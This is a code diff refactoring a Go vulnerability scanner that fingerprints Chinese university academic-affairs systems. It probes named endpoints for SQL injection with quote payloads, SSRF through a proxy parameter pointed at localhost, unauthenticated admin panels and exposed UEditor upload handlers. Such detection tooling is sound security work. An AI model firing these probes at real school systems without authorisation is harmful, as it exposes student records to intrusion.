@@ -2,16 +2,14 @@ package edu
 
 import (
 	"fmt"
-	"io"
-	"net/http"
-	"strings"
-	"time"
+	"net/url"
+
+	"github.com/kunlun-sec/lunying/pkg/utils"
 )
 
 type EduPOCScanner struct {
-	target     string
-	results    []EduPOCResult
-	httpClient *http.Client
+	target  string
+	results []EduPOCResult
 }
 
 type EduPOCResult struct {
@@ -22,18 +20,16 @@ type EduPOCResult struct {
 	Evidence    string
 	Payload     string
 	Description string
+	Confirmed   bool
 }
 
 func NewEduPOCScanner(target string) *EduPOCScanner {
-	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
+	if !utils.HasProtocol(target) {
 		target = "http://" + target
 	}
 	return &EduPOCScanner{
 		target:  target,
 		results: []EduPOCResult{},
-		httpClient: &http.Client{
-			Timeout: 10 * time.Second,
-		},
 	}
 }
 
@@ -50,300 +46,300 @@ func (eps *EduPOCScanner) Scan() ([]EduPOCResult, error) {
 	return eps.results, nil
 }
 
-// ScanAll 扫描所有（API用）
 func (eps *EduPOCScanner) ScanAll() ([]EduPOCResult, error) {
 	return eps.Scan()
 }
 
-// 正方教务系统
 func (eps *EduPOCScanner) scanZFSoft() {
-	paths := []string{
-		"/jwglxt",
-		"/jsxsd",
-		"/xsxk",
-		"/",
-	}
+	fingerprints := []string{"正方", "zfsoft", "jwglxt", "jsxsd"}
+	detectionPaths := []string{"/jwglxt", "/jsxsd", "/xsxk", "/"}
 
-	vulnPaths := []struct {
-		Path        string
-		VulnType    string
-		Description string
-	}{
-		{"/jwglxt/xtgl/login_slogin.html", "信息泄露", "登录页面泄露"},
-		{"/jsxsd/", "信息泄露", "正方系统默认页面"},
-		{"/jwglxt/kjgl/kjgl_queryBySql?sql=", "SQL注入", "SQL注入漏洞"},
-		{"/jsxsd/xsxk/xsxk_index?jx0502zbid=", "SQL注入", "选课SQL注入"},
-		{"/jwglxt/xtgl/init_cxAreaOrProvince.html", "未授权访问", "地区信息未授权访问"},
-		{"/jsxsd/framework/jslib/", "目录遍历", "JS库目录遍历"},
-	}
-
-	for _, path := range paths {
-		baseURL := eps.target + path
-		resp, err := eps.httpClient.Get(baseURL)
-		if err != nil {
-			continue
+	var detected bool
+	for _, path := range detectionPaths {
+		body, _ := utils.FetchBody(eps.target+path, 512*1024)
+		if utils.ContainsAny(body, fingerprints) {
+			fmt.Printf("✅ 发现正方教务系统: %s\n", eps.target+path)
+			detected = true
+			break
 		}
+	}
+	if !detected {
+		return
+	}
 
-		body, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		bodyStr := string(body)
+	sqlPaths := []struct {
+		path    string
+		payload string
+	}{
+		{"/jwglxt/kjgl/kjgl_queryBySql?sql=", "' OR '1'='1"},
+		{"/jsxsd/xsxk/xsxk_index?jx0502zbid=", "'"},
+	}
+	sqlErrors := []string{
+		"SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
+		"Unclosed quotation", "JDBC", "java.sql", "SQLiteException",
+		"Warning: mysql", "supplied argument is not a valid MySQL",
+	}
+	for _, sp := range sqlPaths {
+		testURL := eps.target + sp.path + url.QueryEscape(sp.payload)
+		body, code := utils.FetchBody(testURL, 512*1024)
+		if code == 200 && utils.ContainsAny(body, sqlErrors) {
+			eps.results = append(eps.results, EduPOCResult{
+				SystemType:  "正方教务系统",
+				VulnType:    "SQL注入",
+				Severity:    utils.SeverityCritical,
+				URL:         testURL,
+				Evidence:    utils.ExtractSnippet(body, sqlErrors, 30, 80),
+				Payload:     sp.payload,
+				Description: "正方教务系统存在SQL注入漏洞，攻击者可读取数据库敏感信息",
+				Confirmed:   true,
+			})
+			fmt.Printf("⚠️  [已确认] SQL注入: %s\n", testURL)
+		}
+	}
 
-		if strings.Contains(bodyStr, "正方") || strings.Contains(bodyStr, "zfsoft") {
-			fmt.Printf("✅ 发现正方教务系统: %s\n", baseURL)
-
-			for _, vuln := range vulnPaths {
-				vulnURL := eps.target + vuln.Path
-				resp, err := eps.httpClient.Get(vulnURL)
-				if err != nil {
-					continue
-				}
-				resp.Body.Close()
-
-				if resp.StatusCode == 200 {
-					result := EduPOCResult{
-						SystemType:  "正方教务系统",
-						VulnType:    vuln.VulnType,
-						Severity:    "High",
-						URL:         vulnURL,
-						Evidence:    "页面可访问",
-						Description: vuln.Description,
-					}
-					eps.results = append(eps.results, result)
-					fmt.Printf("⚠️  发现漏洞: %s - %s\n", vuln.VulnType, vulnURL)
-				}
-			}
-			return
+	unauthPaths := []struct {
+		path      string
+		badWords  []string
+		goodWords []string
+	}{
+		{
+			"/jwglxt/xtgl/init_cxAreaOrProvince.html",
+			[]string{"login", "登录", "password"},
+			[]string{"province", "area", "{", "["},
+		},
+		{
+			"/jsxsd/framework/jslib/",
+			[]string{"login", "登录"},
+			[]string{"Index of", "jquery", ".js"},
+		},
+	}
+	for _, up := range unauthPaths {
+		testURL := eps.target + up.path
+		body, code := utils.FetchBody(testURL, 512*1024)
+		if code == 200 && !utils.ContainsAny(body, up.badWords) && utils.ContainsAny(body, up.goodWords) {
+			eps.results = append(eps.results, EduPOCResult{
+				SystemType:  "正方教务系统",
+				VulnType:    "未授权访问",
+				Severity:    utils.SeverityHigh,
+				URL:         testURL,
+				Evidence:    "未经登录即可访问功能页面，响应包含预期内容",
+				Description: "正方教务系统存在未授权访问漏洞",
+				Confirmed:   true,
+			})
+			fmt.Printf("⚠️  [已确认] 未授权访问: %s\n", testURL)
 		}
 	}
 }
 
-// 强智教务系统
 func (eps *EduPOCScanner) scanQZSoft() {
-	paths := []string{
-		"/qzsoft",
-		"/qz",
-		"/",
+	fingerprints := []string{"强智", "qzsoft", "qdjy"}
+	detectionPaths := []string{"/qzsoft", "/qz", "/"}
+
+	var detected bool
+	for _, path := range detectionPaths {
+		body, _ := utils.FetchBody(eps.target+path, 512*1024)
+		if utils.ContainsAny(body, fingerprints) {
+			fmt.Printf("✅ 发现强智教务系统: %s\n", eps.target+path)
+			detected = true
+			break
+		}
+	}
+	if !detected {
+		return
 	}
 
-	vulnPaths := []struct {
-		Path        string
-		VulnType    string
-		Description string
-	}{
-		{"/qzsoft/", "信息泄露", "强智系统默认页面"},
-		{"/qzsoft/proxy", "SSRF", "代理SSRF漏洞"},
-		{"/qzsoft/ueditor/", "文件上传", "UEditor上传漏洞"},
-		{"/qzsoft/admin", "未授权访问", "后台未授权访问"},
+	ssrfPaths := []string{
+		"/qzsoft/proxy?url=http://127.0.0.1",
+		"/qzsoft/proxy?url=http://localhost",
+	}
+	ssrfIndicators := []string{"127.0.0.1", "localhost", "Connection refused", "ECONNREFUSED", "open tcp"}
+	for _, sp := range ssrfPaths {
+		body, code := utils.FetchBody(eps.target+sp, 512*1024)
+		if code == 200 && utils.ContainsAny(body, ssrfIndicators) {
+			eps.results = append(eps.results, EduPOCResult{
+				SystemType:  "强智教务系统",
+				VulnType:    "SSRF",
+				Severity:    utils.SeverityHigh,
+				URL:         eps.target + sp,
+				Evidence:    utils.ExtractSnippet(body, ssrfIndicators, 30, 80),
+				Description: "强智教务系统proxy接口存在SSRF漏洞，可探测内网服务",
+				Confirmed:   true,
+			})
+			fmt.Printf("⚠️  [已确认] SSRF: %s\n", eps.target+sp)
+		}
 	}
 
-	for _, path := range paths {
-		baseURL := eps.target + path
-		resp, err := eps.httpClient.Get(baseURL)
-		if err != nil {
-			continue
-		}
-
-		body, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		bodyStr := string(body)
-
-		if strings.Contains(bodyStr, "强智") || strings.Contains(bodyStr, "qzsoft") {
-			fmt.Printf("✅ 发现强智教务系统: %s\n", baseURL)
-
-			for _, vuln := range vulnPaths {
-				vulnURL := eps.target + vuln.Path
-				resp, err := eps.httpClient.Get(vulnURL)
-				if err != nil {
-					continue
-				}
-				resp.Body.Close()
-
-				if resp.StatusCode == 200 {
-					result := EduPOCResult{
-						SystemType:  "强智教务系统",
-						VulnType:    vuln.VulnType,
-						Severity:    "High",
-						URL:         vulnURL,
-						Evidence:    "页面可访问",
-						Description: vuln.Description,
-					}
-					eps.results = append(eps.results, result)
-					fmt.Printf("⚠️  发现漏洞: %s - %s\n", vuln.VulnType, vulnURL)
-				}
-			}
-			return
-		}
-}
+	adminURL := eps.target + "/qzsoft/admin"
+	body, code := utils.FetchBody(adminURL, 512*1024)
+	adminIndicators := []string{"管理", "admin", "dashboard", "用户管理", "系统设置"}
+	loginIndicators := []string{"login", "登录", "password", "密码", "signin"}
+	if code == 200 && utils.ContainsAny(body, adminIndicators) && !utils.ContainsAny(body, loginIndicators) {
+		eps.results = append(eps.results, EduPOCResult{
+			SystemType:  "强智教务系统",
+			VulnType:    "后台未授权访问",
+			Severity:    utils.SeverityCritical,
+			URL:         adminURL,
+			Evidence:    "直接访问后台页面无需认证，页面包含管理功能",
+			Description: "强智教务系统后台存在未授权访问漏洞",
+			Confirmed:   true,
+		})
+		fmt.Printf("⚠️  [已确认] 后台未授权: %s\n", adminURL)
+	}
 }
 
-// 金智教育
 func (eps *EduPOCScanner) scanKingo() {
-	paths := []string{
-		"/kingo",
-		"/",
+	fingerprints := []string{"金智", "kingo", "kingosoft"}
+	detectionPaths := []string{"/kingo", "/"}
+
+	var detected bool
+	for _, path := range detectionPaths {
+		body, _ := utils.FetchBody(eps.target+path, 512*1024)
+		if utils.ContainsAny(body, fingerprints) {
+			fmt.Printf("✅ 发现金智教务系统: %s\n", eps.target+path)
+			detected = true
+			break
+		}
+	}
+	if !detected {
+		return
 	}
 
-	vulnPaths := []struct {
-		Path        string
-		VulnType    string
-		Description string
-	}{
-		{"/kingo/", "信息泄露", "金智系统默认页面"},
-		{"/kingo/admin", "未授权访问", "后台未授权访问"},
-		{"/kingo/upload", "文件上传", "文件上传漏洞"},
+	adminURL := eps.target + "/kingo/admin"
+	body, code := utils.FetchBody(adminURL, 512*1024)
+	adminIndicators := []string{"管理", "admin", "dashboard", "系统"}
+	loginIndicators := []string{"login", "登录", "password"}
+	if code == 200 && utils.ContainsAny(body, adminIndicators) && !utils.ContainsAny(body, loginIndicators) {
+		eps.results = append(eps.results, EduPOCResult{
+			SystemType:  "金智教务系统",
+			VulnType:    "后台未授权访问",
+			Severity:    utils.SeverityCritical,
+			URL:         adminURL,
+			Evidence:    "直接访问后台无需认证",
+			Description: "金智教务系统后台存在未授权访问漏洞",
+			Confirmed:   true,
+		})
+		fmt.Printf("⚠️  [已确认] 后台未授权: %s\n", adminURL)
 	}
 
-	for _, path := range paths {
-		baseURL := eps.target + path
-		resp, err := eps.httpClient.Get(baseURL)
-		if err != nil {
-			continue
+	ueditorURL := eps.target + "/kingo/ueditor/controller.php?action=catchimage"
+	body, code = utils.FetchBody(ueditorURL, 512*1024)
+	if code == 200 && utils.ContainsAny(body, []string{"state", "url", "ERROR"}) {
+		snippet := body
+		if len(snippet) > 100 {
+			snippet = snippet[:100]
 		}
-
-		body, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		bodyStr := string(body)
-
-		if strings.Contains(bodyStr, "金智") || strings.Contains(bodyStr, "kingo") {
-			fmt.Printf("✅ 发现金智教务系统: %s\n", baseURL)
-
-			for _, vuln := range vulnPaths {
-				vulnURL := eps.target + vuln.Path
-				resp, err := eps.httpClient.Get(vulnURL)
-				if err != nil {
-					continue
-				}
-				resp.Body.Close()
-
-				if resp.StatusCode == 200 {
-					result := EduPOCResult{
-						SystemType:  "金智教务系统",
-						VulnType:    vuln.VulnType,
-						Severity:    "High",
-						URL:         vulnURL,
-						Evidence:    "页面可访问",
-						Description: vuln.Description,
-					}
-					eps.results = append(eps.results, result)
-					fmt.Printf("⚠️  发现漏洞: %s - %s\n", vuln.VulnType, vulnURL)
-				}
-			}
-			return
-		}
+		eps.results = append(eps.results, EduPOCResult{
+			SystemType:  "金智教务系统",
+			VulnType:    "文件上传（UEditor）",
+			Severity:    utils.SeverityHigh,
+			URL:         ueditorURL,
+			Evidence:    "UEditor接口可访问，返回：" + snippet,
+			Description: "金智教务系统UEditor存在文件上传漏洞风险，需进一步验证",
+			Confirmed:   false,
+		})
+		fmt.Printf("⚠️  [待验证] UEditor文件上传: %s\n", ueditorURL)
 	}
 }
 
-// URP教务系统
 func (eps *EduPOCScanner) scanURP() {
-	paths := []string{
-		"/urp",
-		"/",
+	fingerprints := []string{"URP", "urp", "RunQian", "runqian"}
+	detectionPaths := []string{"/urp", "/"}
+
+	var detected bool
+	for _, path := range detectionPaths {
+		body, _ := utils.FetchBody(eps.target+path, 512*1024)
+		if utils.ContainsAny(body, fingerprints) {
+			fmt.Printf("✅ 发现URP教务系统: %s\n", eps.target+path)
+			detected = true
+			break
+		}
+	}
+	if !detected {
+		return
 	}
 
-	vulnPaths := []struct {
-		Path        string
-		VulnType    string
-		Description string
-	}{
-		{"/urp/", "信息泄露", "URP系统默认页面"},
-		{"/urp/servlet/", "未授权访问", "Servlet未授权访问"},
-		{"/urp/servlet/com.runqian.report.view.Servlet", "SQL注入", "报表SQL注入"},
+	servletURL := eps.target + "/urp/servlet/com.runqian.report.view.ReportServlet"
+	body, code := utils.FetchBody(servletURL, 512*1024)
+	servletIndicators := []string{"report", "runqian", "data", "{", "xml", "html"}
+	loginIndicators := []string{"login", "登录", "password"}
+	if code == 200 && utils.ContainsAny(body, servletIndicators) && !utils.ContainsAny(body, loginIndicators) {
+		eps.results = append(eps.results, EduPOCResult{
+			SystemType:  "URP教务系统",
+			VulnType:    "未授权访问",
+			Severity:    utils.SeverityHigh,
+			URL:         servletURL,
+			Evidence:    "Servlet接口无需认证可访问",
+			Description: "URP教务系统Servlet接口存在未授权访问",
+			Confirmed:   true,
+		})
+		fmt.Printf("⚠️  [已确认] Servlet未授权: %s\n", servletURL)
 	}
 
-	for _, path := range paths {
-		baseURL := eps.target + path
-		resp, err := eps.httpClient.Get(baseURL)
-		if err != nil {
-			continue
-		}
-
-		body, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		bodyStr := string(body)
-
-		if strings.Contains(bodyStr, "URP") || strings.Contains(bodyStr, "urp") {
-			fmt.Printf("✅ 发现URP教务系统: %s\n", baseURL)
-
-			for _, vuln := range vulnPaths {
-				vulnURL := eps.target + vuln.Path
-				resp, err := eps.httpClient.Get(vulnURL)
-				if err != nil {
-					continue
-				}
-				resp.Body.Close()
-
-				if resp.StatusCode == 200 {
-					result := EduPOCResult{
-						SystemType:  "URP教务系统",
-						VulnType:    vuln.VulnType,
-						Severity:    "High",
-						URL:         vulnURL,
-						Evidence:    "页面可访问",
-						Description: vuln.Description,
-					}
-					eps.results = append(eps.results, result)
-					fmt.Printf("⚠️  发现漏洞: %s - %s\n", vuln.VulnType, vulnURL)
-				}
-			}
-			return
-		}
+	sqlURL := eps.target + "/urp/servlet/com.runqian.report.view.Servlet?report='"
+	body, code = utils.FetchBody(sqlURL, 512*1024)
+	sqlErrors := []string{"SQL syntax", "ORA-", "java.sql", "JDBC", "Exception"}
+	if code == 200 && utils.ContainsAny(body, sqlErrors) {
+		eps.results = append(eps.results, EduPOCResult{
+			SystemType:  "URP教务系统",
+			VulnType:    "SQL注入",
+			Severity:    utils.SeverityCritical,
+			URL:         sqlURL,
+			Evidence:    utils.ExtractSnippet(body, sqlErrors, 30, 80),
+			Payload:     "'",
+			Description: "URP教务系统报表接口存在SQL注入漏洞",
+			Confirmed:   true,
+		})
+		fmt.Printf("⚠️  [已确认] SQL注入: %s\n", sqlURL)
 	}
 }
 
-// 青果教务系统
 func (eps *EduPOCScanner) scanJWGL() {
-	paths := []string{
-		"/jwgl",
-		"/",
+	fingerprints := []string{"青果", "jwgl", "qinguo"}
+	detectionPaths := []string{"/jwgl", "/"}
+
+	var detected bool
+	for _, path := range detectionPaths {
+		body, _ := utils.FetchBody(eps.target+path, 512*1024)
+		if utils.ContainsAny(body, fingerprints) {
+			fmt.Printf("✅ 发现青果教务系统: %s\n", eps.target+path)
+			detected = true
+			break
+		}
+	}
+	if !detected {
+		return
 	}
 
-	vulnPaths := []struct {
-		Path        string
-		VulnType    string
-		Description string
-	}{
-		{"/jwgl/", "信息泄露", "青果系统默认页面"},
-		{"/jwgl/admin", "未授权访问", "后台未授权访问"},
-		{"/jwgl/ueditor/", "文件上传", "UEditor上传漏洞"},
+	adminURL := eps.target + "/jwgl/admin"
+	body, code := utils.FetchBody(adminURL, 512*1024)
+	adminIndicators := []string{"管理", "admin", "dashboard"}
+	loginIndicators := []string{"login", "登录", "password"}
+	if code == 200 && utils.ContainsAny(body, adminIndicators) && !utils.ContainsAny(body, loginIndicators) {
+		eps.results = append(eps.results, EduPOCResult{
+			SystemType:  "青果教务系统",
+			VulnType:    "后台未授权访问",
+			Severity:    utils.SeverityCritical,
+			URL:         adminURL,
+			Evidence:    "直接访问后台无需认证",
+			Description: "青果教务系统后台存在未授权访问漏洞",
+			Confirmed:   true,
+		})
+		fmt.Printf("⚠️  [已确认] 后台未授权: %s\n", adminURL)
 	}
 
-	for _, path := range paths {
-		baseURL := eps.target + path
-		resp, err := eps.httpClient.Get(baseURL)
-		if err != nil {
-			continue
-		}
-
-		body, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		bodyStr := string(body)
-
-		if strings.Contains(bodyStr, "青果") || strings.Contains(bodyStr, "jwgl") {
-			fmt.Printf("✅ 发现青果教务系统: %s\n", baseURL)
-
-			for _, vuln := range vulnPaths {
-				vulnURL := eps.target + vuln.Path
-				resp, err := eps.httpClient.Get(vulnURL)
-				if err != nil {
-					continue
-				}
-				resp.Body.Close()
-
-				if resp.StatusCode == 200 {
-					result := EduPOCResult{
-						SystemType:  "青果教务系统",
-						VulnType:    vuln.VulnType,
-						Severity:    "High",
-						URL:         vulnURL,
-						Evidence:    "页面可访问",
-						Description: vuln.Description,
-					}
-					eps.results = append(eps.results, result)
-					fmt.Printf("⚠️  发现漏洞: %s - %s\n", vuln.VulnType, vulnURL)
-				}
-			}
-			return
-		}
+	ueditorURL := eps.target + "/jwgl/ueditor/controller.php?action=catchimage"
+	body, code = utils.FetchBody(ueditorURL, 512*1024)
+	if code == 200 && utils.ContainsAny(body, []string{"state", "url", "ERROR"}) {
+		eps.results = append(eps.results, EduPOCResult{
+			SystemType:  "青果教务系统",
+			VulnType:    "文件上传（UEditor）",
+			Severity:    utils.SeverityHigh,
+			URL:         ueditorURL,
+			Evidence:    "UEditor接口可访问",
+			Description: "青果教务系统UEditor存在文件上传风险，需手工验证",
+			Confirmed:   false,
+		})
+		fmt.Printf("⚠️  [待验证] UEditor: %s\n", ueditorURL)
 	}
 }
 
